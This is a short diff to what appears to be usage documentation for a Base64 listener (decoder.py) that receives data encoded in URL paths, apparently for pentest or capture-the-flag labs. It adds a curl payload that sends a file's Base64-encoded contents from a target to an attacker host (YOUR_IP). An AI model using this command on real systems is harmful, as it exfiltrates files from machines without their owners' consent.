@@ -13,8 +13,10 @@ python3 decoder.py 9001
 [*] Base64 Listener started on port 9001
 [*] Make sure YOUR_IP is accessible by the target.
 [*] Waiting for incoming Base64 encoded data in URL paths...
+[*] Use payload: curl http://YOUR_IP:1050/$(cat /path/to/file | base64 -w 0)
 
---- Received Base64 String from 10.129.175.110 ---
+
+--- Received Base64 String from 10.10.0.15 ---
 PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KPHRpdGx[...snip...]+CjwvaHRtbD4K
 --- Decoded Content ---
 <!DOCTYPE html>
